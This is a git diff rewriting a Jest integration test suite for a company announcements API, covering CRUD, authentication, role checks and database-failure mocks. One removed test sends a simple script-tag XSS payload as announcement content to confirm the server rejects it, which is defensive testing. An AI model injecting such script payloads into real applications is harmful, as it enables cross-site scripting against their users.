@@ -58,17 +58,137 @@ describe('Company Announcements System Integration Tests', () => {
     await Announcement.deleteMany({});
   });
 
-  describe('[TC-003] Integration testing for API endpoints', () => {
-    describe('GET /api/announcements - Happy Path', () => {
-      test('[TC-003-HP-001] should return all active announcements with proper structure', async () => {
-        // Create test data
-        await Announcement.create({
+  // TC-001: Comprehensive CRUD Operations Test Coverage
+  describe('[TC-001] Announcement CRUD Operations - Complete Test Coverage', () => {
+    // CREATE Operation Tests
+    describe('[TC-001-CREATE] CREATE Operation Tests', () => {
+      test('[TC-001-CREATE-HP-001] should successfully create announcement with valid data (happy path)', async () => {
+        const announcementData = {
           title: 'Test Announcement',
-          content: 'Test content',
+          content: 'This is a test announcement content'
+        };
+
+        const response = await request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send(announcementData);
+
+        expect(response.status).toBe(201);
+        expect(response.body.success).toBe(true);
+        expect(response.body.data.title).toBe(announcementData.title);
+        expect(response.body.data.content).toBe(announcementData.content);
+        expect(response.body.data._id).toBeDefined();
+        expect(response.body.data.createdBy).toBeDefined();
+        expect(response.body.data.isActive).toBe(true);
+
+        // Verify in database
+        const savedAnnouncement = await Announcement.findById(response.body.data._id);
+        expect(savedAnnouncement).toBeTruthy();
+        expect(savedAnnouncement.title).toBe(announcementData.title);
+        expect(savedAnnouncement.content).toBe(announcementData.content);
+      });
+
+      test('[TC-001-CREATE-HP-002] should create announcement with all optional fields (happy path)', async () => {
+        const announcementData = {
+          title: 'Complete Test Announcement',
+          content: 'This is a comprehensive test announcement with all fields',
+          isActive: true
+        };
+
+        const response = await request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send(announcementData);
+
+        expect(response.status).toBe(201);
+        expect(response.body.success).toBe(true);
+        expect(response.body.data.title).toBe(announcementData.title);
+        expect(response.body.data.content).toBe(announcementData.content);
+        expect(response.body.data.isActive).toBe(true);
+      });
+
+      test('[TC-001-CREATE-EP-001] should fail to create announcement with missing title (error path)', async () => {
+        const response = await request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({ content: 'Content without title' });
+
+        expect(response.status).toBe(400);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Validation errors');
+      });
+
+      test('[TC-001-CREATE-EP-002] should fail to create announcement with empty title (error path)', async () => {
+        const response = await request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({ title: '', content: 'Content with empty title' });
+
+        expect(response.status).toBe(400);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Validation errors');
+      });
+
+      test('[TC-001-CREATE-EP-003] should fail to create announcement with missing content (error path)', async () => {
+        const response = await request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({ title: 'Title without content' });
+
+        expect(response.status).toBe(400);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Validation errors');
+      });
+
+      test('[TC-001-CREATE-EP-004] should deny non-admin users from creating announcements (error path)', async () => {
+        const response = await request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${employeeToken}`)
+          .send({ title: 'Unauthorized', content: 'Should not work' });
+
+        expect(response.status).toBe(403);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toBe('Access denied. Admin privileges required.');
+      });
+
+      test('[TC-001-CREATE-EP-005] should handle database save failures (error path)', async () => {
+        const originalCreate = Announcement.create;
+        Announcement.create = jest.fn().mockRejectedValue(new Error('Database save failed'));
+
+        const response = await request(app)
+          .post('/api/announcements')
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({ title: 'Test', content: 'Test content' });
+
+        expect(response.status).toBe(500);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Failed to create announcement');
+
+        Announcement.create = originalCreate;
+      });
+
+      test('[TC-001-CREATE-EP-006] should reject unauthenticated requests (error path)', async () => {
+        const response = await request(app)
+          .post('/api/announcements')
+          .send({ title: 'Test', content: 'Test content' });
+
+        expect(response.status).toBe(401);
+        expect(response.body.error).toBe('Access token required');
+      });
+    });
+
+    // READ Operation Tests
+    describe('[TC-001-READ] READ Operation Tests', () => {
+      beforeEach(async () => {
+        await Announcement.create({
+          title: 'Test Read Announcement',
+          content: 'Content for read test',
           createdBy: adminUser._id,
           isActive: true
         });
+      });
 
+      test('[TC-001-READ-HP-001] should successfully retrieve all announcements (happy path)', async () => {
         const response = await request(app)
           .get('/api/announcements')
           .set('Authorization', `Bearer ${employeeToken}`);
@@ -76,25 +196,20 @@ describe('Company Announcements System Integration Tests', () => {
         expect(response.status).toBe(200);
         expect(Array.isArray(response.body)).toBe(true);
         expect(response.body).toHaveLength(1);
-        expect(response.body[0]).toHaveProperty('title', 'Test Announcement');
-        expect(response.body[0]).toHaveProperty('content', 'Test content');
-        expect(response.body[0]).toHaveProperty('created_at');
-        expect(response.body[0]).toHaveProperty('isActive', true);
+        expect(response.body[0].title).toBe('Test Read Announcement');
+        expect(response.body[0].content).toBe('Content for read test');
+        expect(response.body[0]._id).toBeDefined();
+        expect(response.body[0].created_at).toBeDefined();
       });
 
-      test('[TC-003-HP-002] should filter out inactive announcements', async () => {
+      test('[TC-001-READ-HP-002] should retrieve announcements sorted by creation date (happy path)', async () => {
+        // Create second announcement
+        await new Promise(resolve => setTimeout(resolve, 10)); // Small delay to ensure different timestamps
         await Announcement.create({
-          title: 'Active Announcement',
-          content: 'Active content',
+          title: 'Newer Announcement',
+          content: 'Newer content',
           createdBy: adminUser._id,
           isActive: true
-        });
-
-        await Announcement.create({
-          title: 'Inactive Announcement',
-          content: 'Inactive content',
-          createdBy: adminUser._id,
-          isActive: false
         });
 
         const response = await request(app)
@@ -102,11 +217,31 @@ describe('Company Announcements System Integration Tests', () => {
           .set('Authorization', `Bearer ${employeeToken}`);
 
         expect(response.status).toBe(200);
-        expect(response.body).toHaveLength(1);
-        expect(response.body[0].title).toBe('Active Announcement');
+        expect(response.body).toHaveLength(2);
+        
+        // Verify sorting (newest first)
+        const firstDate = new Date(response.body[0].created_at);
+        const secondDate = new Date(response.body[1].created_at);
+        expect(firstDate.getTime()).toBeGreaterThanOrEqual(secondDate.getTime());
       });
 
-      test('[TC-003-HP-003] should return empty array when no active announcements exist', async () => {
+      test('[TC-001-READ-HP-003] should allow all authenticated user roles to read announcements (happy path)', async () => {
+        const allTokens = [adminToken, employeeToken, managerToken];
+        
+        for (const token of allTokens) {
+          const response = await request(app)
+            .get('/api/announcements')
+            .set('Authorization', `Bearer ${token}`);
+
+          expect(response.status).toBe(200);
+          expect(response.body).toHaveLength(1);
+          expect(response.body[0].title).toBe('Test Read Announcement');
+        }
+      });
+
+      test('[TC-001-READ-EP-001] should handle empty announcements list (error path)', async () => {
+        await Announcement.deleteMany({});
+
         const response = await request(app)
           .get('/api/announcements')
           .set('Authorization', `Bearer ${employeeToken}`);
@@ -114,31 +249,12 @@ describe('Company Announcements System Integration Tests', () => {
         expect(response.status).toBe(200);
         expect(response.body).toEqual([]);
       });
-    });
 
-    describe('GET /api/announcements - Error Path', () => {
-      test('[TC-003-EP-001] should return 401 when no authorization token provided', async () => {
-        const response = await request(app)
-          .get('/api/announcements');
-
-        expect(response.status).toBe(401);
-        expect(response.body.error).toBe('Access token required');
-      });
-
-      test('[TC-003-EP-002] should return 403 when invalid token provided', async () => {
-        const response = await request(app)
-          .get('/api/announcements')
-          .set('Authorization', 'Bearer invalid_token');
-
-        expect(response.status).toBe(403);
-        expect(response.body.error).toBe('Invalid or expired token');
-      });
-
-      test('[TC-003-EP-003] should handle database connection errors gracefully', async () => {
+      test('[TC-001-READ-EP-002] should handle database query failures (error path)', async () => {
         const originalFind = Announcement.find;
         Announcement.find = jest.fn().mockReturnValue({
           populate: jest.fn().mockReturnValue({
-            sort: jest.fn().mockRejectedValue(new Error('Database connection failed'))
+            sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
           })
         });
 
@@ -151,231 +267,83 @@ describe('Company Announcements System Integration Tests', () => {
 
         Announcement.find = originalFind;
       });
-    });
 
-    describe('POST /api/announcements - Happy Path', () => {
-      test('[TC-003-HP-004] should create announcement successfully with valid admin token', async () => {
-        const announcementData = {
-          title: 'New Company Policy',
-          content: 'Important policy update for all employees'
-        };
-
+      test('[TC-001-READ-EP-003] should deny access without authentication (error path)', async () => {
         const response = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send(announcementData);
+          .get('/api/announcements');
 
-        expect(response.status).toBe(201);
-        expect(response.body.success).toBe(true);
-        expect(response.body.data.title).toBe(announcementData.title);
-        expect(response.body.data.content).toBe(announcementData.content);
-        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
-        expect(response.body.data.isActive).toBe(true);
+        expect(response.status).toBe(401);
+        expect(response.body.error).toBe('Access token required');
       });
 
-      test('[TC-003-HP-005] should set proper metadata on announcement creation', async () => {
-        const announcementData = {
-          title: 'Metadata Test',
-          content: 'Testing metadata fields'
-        };
-
+      test('[TC-001-READ-EP-004] should reject invalid authentication tokens (error path)', async () => {
         const response = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send(announcementData);
-
-        expect(response.status).toBe(201);
-        expect(response.body.data).toHaveProperty('created_at');
-        expect(response.body.data).toHaveProperty('updated_at');
-        expect(response.body.data).toHaveProperty('_id');
-        expect(new Date(response.body.data.created_at)).toBeInstanceOf(Date);
-      });
-    });
-
-    describe('POST /api/announcements - Error Path', () => {
-      test('[TC-003-EP-004] should return 403 when non-admin tries to create announcement', async () => {
-        const response = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${employeeToken}`)
-          .send({
-            title: 'Unauthorized Announcement',
-            content: 'Should not be allowed'
-          });
+          .get('/api/announcements')
+          .set('Authorization', 'Bearer invalid_token');
 
         expect(response.status).toBe(403);
-        expect(response.body.success).toBe(false);
-        expect(response.body.message).toBe('Access denied. Admin privileges required.');
-      });
-
-      test('[TC-003-EP-005] should return 400 when required fields are missing', async () => {
-        const response = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send({ title: '' });
-
-        expect(response.status).toBe(400);
-        expect(response.body.success).toBe(false);
-        expect(response.body.message).toContain('Validation errors');
-      });
-
-      test('[TC-003-EP-006] should return 400 when content contains malicious scripts', async () => {
-        const response = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send({
-            title: 'Test Title',
-            content: '<script>alert("xss")</script>'
-          });
-
-        expect(response.status).toBe(400);
-        expect(response.body.success).toBe(false);
-        expect(response.body.message).toContain('Invalid content format');
-      });
-
-      test('[TC-003-EP-007] should handle database save failures', async () => {
-        const originalCreate = Announcement.create;
-        Announcement.create = jest.fn().mockRejectedValue(new Error('Database save failed'));
-
-        const response = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send({
-            title: 'Test Announcement',
-            content: 'Test content'
-          });
-
-        expect(response.status).toBe(500);
-        expect(response.body.success).toBe(false);
-        expect(response.body.message).toContain('Failed to create announcement');
-
-        Announcement.create = originalCreate;
+        expect(response.body.error).toBe('Invalid or expired token');
       });
     });
 
-    describe('GET /api/announcements/admin - Happy Path', () => {
-      test('[TC-003-HP-006] should return all announcements including inactive for admin', async () => {
-        await Announcement.create({
-          title: 'Active Announcement',
-          content: 'Active content',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
-        await Announcement.create({
-          title: 'Inactive Announcement',
-          content: 'Inactive content',
-          createdBy: adminUser._id,
-          isActive: false
-        });
-
-        const response = await request(app)
-          .get('/api/announcements/admin')
-          .set('Authorization', `Bearer ${adminToken}`);
-
-        expect(response.status).toBe(200);
-        expect(response.body).toHaveLength(2);
-        const titles = response.body.map(a => a.title);
-        expect(titles).toContain('Active Announcement');
-        expect(titles).toContain('Inactive Announcement');
-      });
-
-      test('[TC-003-HP-007] should return populated createdBy field for admin view', async () => {
-        await Announcement.create({
-          title: 'Admin View Test',
-          content: 'Testing admin view',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
-        const response = await request(app)
-          .get('/api/announcements/admin')
-          .set('Authorization', `Bearer ${adminToken}`);
-
-        expect(response.status).toBe(200);
-        expect(response.body[0]).toHaveProperty('createdBy');
-        expect(response.body[0].createdBy).toHaveProperty('username', 'admin_test');
-      });
-    });
-
-    describe('GET /api/announcements/admin - Error Path', () => {
-      test('[TC-003-EP-008] should return 403 when non-admin accesses admin endpoint', async () => {
-        const response = await request(app)
-          .get('/api/announcements/admin')
-          .set('Authorization', `Bearer ${employeeToken}`);
-
-        expect(response.status).toBe(403);
-        expect(response.body.error).toBe('Access denied. Admin privileges required.');
-      });
-
-      test('[TC-003-EP-009] should handle database errors in admin endpoint', async () => {
-        const originalFind = Announcement.find;
-        Announcement.find = jest.fn().mockReturnValue({
-          populate: jest.fn().mockReturnValue({
-            sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
-          })
-        });
-
-        const response = await request(app)
-          .get('/api/announcements/admin')
-          .set('Authorization', `Bearer ${adminToken}`);
-
-        expect(response.status).toBe(500);
-        expect(response.body.error).toContain('Internal server error');
-
-        Announcement.find = originalFind;
-      });
-    });
-
-    describe('PUT /api/announcements/:id - Happy Path', () => {
-      test('[TC-003-HP-008] should update announcement successfully', async () => {
-        const announcement = await Announcement.create({
+    // UPDATE Operation Tests
+    describe('[TC-001-UPDATE] UPDATE Operation Tests', () => {
+      beforeEach(async () => {
+        testAnnouncement = await Announcement.create({
           title: 'Original Title',
           content: 'Original content',
           createdBy: adminUser._id,
           isActive: true
         });
+      });
 
-        const updateData = {
+      test('[TC-001-UPDATE-HP-001] should successfully update announcement with valid data (happy path)', async () => {
+        const updatedData = {
           title: 'Updated Title',
-          content: 'Updated content'
+          content: 'Updated content with new information'
         };
 
         const response = await request(app)
-          .put(`/api/announcements/${announcement._id}`)
+          .put(`/api/announcements/${testAnnouncement._id}`)
           .set('Authorization', `Bearer ${adminToken}`)
-          .send(updateData);
+          .send(updatedData);
 
         expect(response.status).toBe(200);
         expect(response.body.success).toBe(true);
-        expect(response.body.data.title).toBe('Updated Title');
-        expect(response.body.data.content).toBe('Updated content');
+        expect(response.body.data.title).toBe(updatedData.title);
+        expect(response.body.data.content).toBe(updatedData.content);
+        expect(response.body.data._id).toBe(testAnnouncement._id.toString());
+
+        // Verify in database
+        const updatedAnnouncement = await Announcement.findById(testAnnouncement._id);
+        expect(updatedAnnouncement.title).toBe(updatedData.title);
+        expect(updatedAnnouncement.content).toBe(updatedData.content);
       });
 
-      test('[TC-003-HP-009] should preserve system fields during update', async () => {
-        const announcement = await Announcement.create({
-          title: 'Original Title',
-          content: 'Original content',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
+      test('[TC-001-UPDATE-HP-002] should allow partial updates (happy path)', async () => {
         const response = await request(app)
-          .put(`/api/announcements/${announcement._id}`)
+          .put(`/api/announcements/${testAnnouncement._id}`)
           .set('Authorization', `Bearer ${adminToken}`)
-          .send({
-            title: 'Updated Title',
-            content: 'Updated content',
-            createdBy: employeeUser._id, // Should be ignored
-            created_at: new Date('2020-01-01') // Should be ignored
-          });
+          .send({ title: 'Only Title Updated' });
 
         expect(response.status).toBe(200);
-        expect(response.body.data.createdBy).toBe(adminUser._id.toString());
+        expect(response.body.success).toBe(true);
+        expect(response.body.data.title).toBe('Only Title Updated');
+        expect(response.body.data.content).toBe('Original content');
       });
-    });
 
-    describe('PUT /api/announcements/:id - Error Path', () => {
-      test('[TC-003-EP-010] should return 404 when announcement not found', async () => {
+      test('[TC-001-UPDATE-HP-003] should update isActive status (happy path)', async () => {
+        const response = await request(app)
+          .put(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({ isActive: false });
+
+        expect(response.status).toBe(200);
+        expect(response.body.success).toBe(true);
+        expect(response.body.data.isActive).toBe(false);
+      });
+
+      test('[TC-001-UPDATE-EP-001] should return 404 for non-existent announcement (error path)', async () => {
         const response = await request(app)
           .put('/api/announcements/507f1f77bcf86cd799439011')
           .set('Authorization', `Bearer ${adminToken}`)
@@ -383,28 +351,34 @@ describe('Company Announcements System Integration Tests', () => {
 
         expect(response.status).toBe(404);
         expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('not found');
       });
 
-      test('[TC-003-EP-011] should return 400 for invalid ObjectId format', async () => {
+      test('[TC-001-UPDATE-EP-002] should validate update data (error path)', async () => {
         const response = await request(app)
-          .put('/api/announcements/invalid_id')
+          .put(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({ title: '' }); // Invalid empty title
+
+        expect(response.status).toBe(400);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Validation');
+      });
+
+      test('[TC-001-UPDATE-EP-003] should handle invalid ObjectId format (error path)', async () => {
+        const response = await request(app)
+          .put('/api/announcements/invalid-id')
           .set('Authorization', `Bearer ${adminToken}`)
           .send({ title: 'Updated', content: 'Updated content' });
 
         expect(response.status).toBe(400);
+        expect(response.body.success).toBe(false);
         expect(response.body.message).toContain('Invalid ID format');
       });
 
-      test('[TC-003-EP-012] should return 403 when non-admin tries to update', async () => {
-        const announcement = await Announcement.create({
-          title: 'Original Title',
-          content: 'Original content',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
+      test('[TC-001-UPDATE-EP-004] should deny non-admin users from updating (error path)', async () => {
         const response = await request(app)
-          .put(`/api/announcements/${announcement._id}`)
+          .put(`/api/announcements/${testAnnouncement._id}`)
           .set('Authorization', `Bearer ${employeeToken}`)
           .send({ title: 'Unauthorized Update' });
 
@@ -412,545 +386,696 @@ describe('Company Announcements System Integration Tests', () => {
         expect(response.body.success).toBe(false);
         expect(response.body.message).toBe('Access denied. Admin privileges required.');
       });
+
+      test('[TC-001-UPDATE-EP-005] should handle database update failures (error path)', async () => {
+        const originalFindByIdAndUpdate = Announcement.findByIdAndUpdate;
+        Announcement.findByIdAndUpdate = jest.fn().mockRejectedValue(new Error('Database update failed'));
+
+        const response = await request(app)
+          .put(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${adminToken}`)
+          .send({ title: 'Updated', content: 'Updated content' });
+
+        expect(response.status).toBe(500);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Failed to update announcement');
+
+        Announcement.findByIdAndUpdate = originalFindByIdAndUpdate;
+      });
+
+      test('[TC-001-UPDATE-EP-006] should reject unauthenticated requests (error path)', async () => {
+        const response = await request(app)
+          .put(`/api/announcements/${testAnnouncement._id}`)
+          .send({ title: 'Unauthorized Update' });
+
+        expect(response.status).toBe(401);
+        expect(response.body.error).toBe('Access token required');
+      });
     });
 
-    describe('DELETE /api/announcements/:id - Happy Path', () => {
-      test('[TC-003-HP-010] should delete announcement successfully', async () => {
-        const announcement = await Announcement.create({
-          title: 'To Be Deleted',
-          content: 'Delete me',
+    // DELETE Operation Tests
+    describe('[TC-001-DELETE] DELETE Operation Tests', () => {
+      beforeEach(async () => {
+        testAnnouncement = await Announcement.create({
+          title: 'Announcement to Delete',
+          content: 'This will be deleted',
           createdBy: adminUser._id,
           isActive: true
         });
+      });
 
+      test('[TC-001-DELETE-HP-001] should successfully delete announcement (happy path)', async () => {
         const response = await request(app)
-          .delete(`/api/announcements/${announcement._id}`)
+          .delete(`/api/announcements/${testAnnouncement._id}`)
           .set('Authorization', `Bearer ${adminToken}`);
 
         expect(response.status).toBe(200);
         expect(response.body.success).toBe(true);
+        expect(response.body.message).toContain('deleted');
 
-        // Verify announcement is deleted
-        const deletedAnnouncement = await Announcement.findById(announcement._id);
+        // Verify removal from database
+        const deletedAnnouncement = await Announcement.findById(testAnnouncement._id);
         expect(deletedAnnouncement).toBeNull();
       });
 
-      test('[TC-003-HP-011] should remove announcement from public view immediately', async () => {
-        const announcement = await Announcement.create({
-          title: 'Public Announcement',
-          content: 'Visible to all',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
-        // Delete announcement
-        await request(app)
-          .delete(`/api/announcements/${announcement._id}`)
-          .set('Authorization', `Bearer ${adminToken}`);
-
-        // Check public view
-        const publicResponse = await request(app)
+      test('[TC-001-DELETE-HP-002] should remove announcement from user view immediately (happy path)', async () => {
+        // Confirm announcement is visible before deletion
+        let viewResponse = await request(app)
           .get('/api/announcements')
           .set('Authorization', `Bearer ${employeeToken}`);
+        expect(viewResponse.body).toHaveLength(1);
 
-        expect(publicResponse.status).toBe(200);
-        expect(publicResponse.body).toHaveLength(0);
+        // Delete announcement
+        const deleteResponse = await request(app)
+          .delete(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${adminToken}`);
+        expect(deleteResponse.status).toBe(200);
+
+        // Verify no longer visible
+        viewResponse = await request(app)
+          .get('/api/announcements')
+          .set('Authorization', `Bearer ${employeeToken}`);
+        expect(viewResponse.body).toHaveLength(0);
       });
-    });
 
-    describe('DELETE /api/announcements/:id - Error Path', () => {
-      test('[TC-003-EP-013] should return 404 when trying to delete non-existent announcement', async () => {
+      test('[TC-001-DELETE-EP-001] should return 404 for non-existent announcement (error path)', async () => {
         const response = await request(app)
           .delete('/api/announcements/507f1f77bcf86cd799439011')
           .set('Authorization', `Bearer ${adminToken}`);
 
         expect(response.status).toBe(404);
         expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('not found');
       });
 
-      test('[TC-003-EP-014] should return 400 for invalid ObjectId in delete', async () => {
+      test('[TC-001-DELETE-EP-002] should handle invalid announcement ID format (error path)', async () => {
         const response = await request(app)
-          .delete('/api/announcements/invalid_id')
+          .delete('/api/announcements/invalid-id')
           .set('Authorization', `Bearer ${adminToken}`);
 
         expect(response.status).toBe(400);
+        expect(response.body.success).toBe(false);
         expect(response.body.message).toContain('Invalid ID format');
       });
 
-      test('[TC-003-EP-015] should return 403 when non-admin tries to delete', async () => {
-        const announcement = await Announcement.create({
-          title: 'Protected Announcement',
-          content: 'Cannot be deleted by non-admin',
-          createdBy: adminUser._id,
-          isActive: true
-        });
-
+      test('[TC-001-DELETE-EP-003] should deny non-admin users from deleting (error path)', async () => {
         const response = await request(app)
-          .delete(`/api/announcements/${announcement._id}`)
+          .delete(`/api/announcements/${testAnnouncement._id}`)
           .set('Authorization', `Bearer ${employeeToken}`);
 
         expect(response.status).toBe(403);
         expect(response.body.success).toBe(false);
         expect(response.body.message).toBe('Access denied. Admin privileges required.');
       });
-    });
 
-    describe('API Response Format Validation', () => {
-      test('[TC-003-HP-012] should maintain consistent response format across all endpoints', async () => {
-        const announcement = await Announcement.create({
-          title: 'Format Test',
-          content: 'Testing response format',
-          createdBy: adminUser._id,
-          isActive: true
-        });
+      test('[TC-001-DELETE-EP-004] should handle database deletion failures (error path)', async () => {
+        const originalFindByIdAndDelete = Announcement.findByIdAndDelete;
+        Announcement.findByIdAndDelete = jest.fn().mockRejectedValue(new Error('Database delete failed'));
 
-        // Test GET format
-        const getResponse = await request(app)
-          .get('/api/announcements')
-          .set('Authorization', `Bearer ${employeeToken}`);
-
-        expect(getResponse.status).toBe(200);
-        expect(Array.isArray(getResponse.body)).toBe(true);
-
-        // Test POST format
-        const postResponse = await request(app)
-          .post('/api/announcements')
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send({ title: 'Format Test 2', content: 'Test content' });
-
-        expect(postResponse.status).toBe(201);
-        expect(postResponse.body).toHaveProperty('success', true);
-        expect(postResponse.body).toHaveProperty('data');
-
-        // Test PUT format
-        const putResponse = await request(app)
-          .put(`/api/announcements/${announcement._id}`)
-          .set('Authorization', `Bearer ${adminToken}`)
-          .send({ title: 'Updated Format Test' });
-
-        expect(putResponse.status).toBe(200);
-        expect(putResponse.body).toHaveProperty('success', true);
-        expect(putResponse.body).toHaveProperty('data');
-
-        // Test DELETE format
-        const deleteResponse = await request(app)
-          .delete(`/api/announcements/${announcement._id}`)
+        const response = await request(app)
+          .delete(`/api/announcements/${testAnnouncement._id}`)
           .set('Authorization', `Bearer ${adminToken}`);
 
-        expect(deleteResponse.status).toBe(200);
-        expect(deleteResponse.body).toHaveProperty('success', true);
+        expect(response.status).toBe(500);
+        expect(response.body.success).toBe(false);
+        expect(response.body.message).toContain('Failed to delete announcement');
+
+        Announcement.findByIdAndDelete = originalFindByIdAndDelete;
+      });
+
+      test('[TC-001-DELETE-EP-005] should reject unauthenticated requests (error path)', async () => {
+        const response = await request(app)
+          .delete(`/api/announcements/${testAnnouncement._id}`);
+
+        expect(response.status).toBe(401);
+        expect(response.body.error).toBe('Access token required');
+      });
+
+      test('[TC-001-DELETE-EP-006] should handle multiple deletion attempts gracefully (error path)', async () => {
+        // First deletion should succeed
+        const firstResponse = await request(app)
+          .delete(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${adminToken}`);
+        expect(firstResponse.status).toBe(200);
+
+        // Second deletion should return 404
+        const secondResponse = await request(app)
+          .delete(`/api/announcements/${testAnnouncement._id}`)
+          .set('Authorization', `Bearer ${adminToken}`);
+        expect(secondResponse.status).toBe(404);
       });
     });
 
-    describe('Cross-endpoint Integration Tests', () => {
-      test('[TC-003-HP-013] should maintain data consistency across all operations', async () => {
-        // Create announcement
+    // CRUD Integration Tests
+    describe('[TC-001-INTEGRATION] CRUD Integration Tests', () => {
+      test('[TC-001-INTEGRATION-HP-001] should perform complete CRUD lifecycle (happy path)', async () => {
+        // CREATE
         const createResponse = await request(app)
           .post('/api/announcements')
           .set('Authorization', `Bearer ${adminToken}`)
           .send({
-            title: 'Integration Test',
-            content: 'Testing cross-endpoint consistency'
+            title: 'CRUD Lifecycle Test',
+            content: 'Testing complete CRUD lifecycle'
           });
 
         expect(createResponse.status).toBe(201);
         const announcementId = createResponse.body.data._id;
 
-        // Verify creation in public view
-        const publicView = await request(app)
+        // READ
+        const readResponse = await request(app)
           .get('/api/announcements')
           .set('Authorization', `Bearer ${employeeToken}`);
 
-        expect(publicView.status).toBe(200);
-        expect(publicView.body).toHaveLength(1);
-        expect(publicView.body[0]._id).toBe(announcementId);
+        expect(readResponse.status).toBe(200);
+        expect(readResponse.body).toHaveLength(1);
+        expect(readResponse.body[0].title).toBe('CRUD Lifecycle Test');
 
-        // Verify creation in admin view
-        const adminView = await request(app)
-          .get('/api/announcements/admin')
-          .set('Authorization', `Bearer ${adminToken}`);
-
-        expect(adminView.status).toBe(200);
-        expect(adminView.body).toHaveLength(1);
-        expect(adminView.body[0]._id).toBe(announcementId);
-
-        // Update announcement
+        // UPDATE
         const updateResponse = await request(app)
           .put(`/api/announcements/${announcementId}`)
           .set('Authorization', `Bearer ${adminToken}`)
-          .send({ title: 'Updated Integration Test' });
+          .send({
+            title: 'Updated CRUD Test',
+            content: 'Updated content for CRUD test'
+          });
 
         expect(updateResponse.status).toBe(200);
+        expect(updateResponse.body.data.title).toBe('Updated CRUD Test');
 
-        // Verify update in public view
-        const updatedPublicView = await request(app)
-          .get('/api/announcements')
-          .set('Authorization', `Bearer ${employeeToken}`);
-
-        expect(updatedPublicView.status).toBe(200);
-        expect(updatedPublicView.body[0].title).toBe('Updated Integration Test');
-
-        // Delete announcement
+        // DELETE
         const deleteResponse = await request(app)
           .delete(`/api/announcements/${announcementId}`)
           .set('Authorization', `Bearer ${adminToken}`);
 
         expect(deleteResponse.status).toBe(200);
 
-        // Verify deletion in public view
-        const finalPublicView = await request(app)
+        // Verify deletion
+        const finalReadResponse = await request(app)
           .get('/api/announcements')
           .set('Authorization', `Bearer ${employeeToken}`);
 
-        expect(finalPublicView.status).toBe(200);
-        expect(finalPublicView.body).toHaveLength(0);
+        expect(finalReadResponse.status).toBe(200);
+        expect(finalReadResponse.body).toHaveLength(0);
+      });
+
+      test('[TC-001-INTEGRATION-EP-001] should maintain data consistency across operations (error path)', async () => {
+        // Create multiple announcements
+        const announcements = [
+          { title: 'First', content: 'First content' },
+          { title: 'Second', content: 'Second content' },
+          { title: 'Third', content: 'Third content' }
+        ];
+
+        const createPromises = announcements.map(ann =>
+          request(app)
+            .post('/api/announcements')
+            .set('Authorization', `Bearer ${adminToken}`)
+            .send(ann)
+        );
+
+        const createResponses = await Promise.all(createPromises);
+        createResponses.forEach(response => {
+          expect(response.status).toBe(201);
+        });
+
+        // Verify all created
+        const readResponse = await request(app)
+          .get('/api/announcements')
+          .set('Authorization', `Bearer ${employeeToken}`);
+
+        expect(readResponse.status).toBe(200);
+        expect(readResponse.body).toHaveLength(3);
+
+        // Delete one and verify count
+        const deleteResponse = await request(app)
+          .delete(`/api/announcements/${createResponses[0].body.data._id}`)
+          .set('Authorization', `Bearer ${adminToken}`);
+
+        expect(deleteResponse.status).toBe(200);
+
+        const finalReadResponse = await request(app)
+          .get('/api/announcements')
+          .set('Authorization', `Bearer ${employeeToken}`);
+
+        expect(finalReadResponse.status).toBe(200);
+        expect(finalReadResponse.body).toHaveLength(2);
       });
     });
   });
 
-  describe('[TC-SEC-001] Security and Authorization Tests', () => {
-    describe('Authentication Security', () => {
-      test('[TC-SEC-001-1] should reject unauthenticated requests to all endpoints', async () => {
-        const endpoints = [
-          { method: 'get', path: '/api/announcements' },
-          { method: 'post', path: '/api/announcements' },
-          { method: 'get', path: '/api/announcements/admin' },
-          { method: 'put', path: '/api/announcements/507f1f77bcf86cd799439011' },
-          { method: 'delete', path: '/api/announcements/507f1f77bcf86cd799439011' }
-        ];
+  describe('[TC-SECURITY-001] Authentication Security Tests', () => {
+    test('should reject requests without authentication token', async () => {
+      const response = await request(app)
+        .get('/api/announcements');
 
-        for (const endpoint of endpoints) {
-          const response = await request(app)[endpoint.method](endpoint.path);
-          expect(response.status).toBe(401);
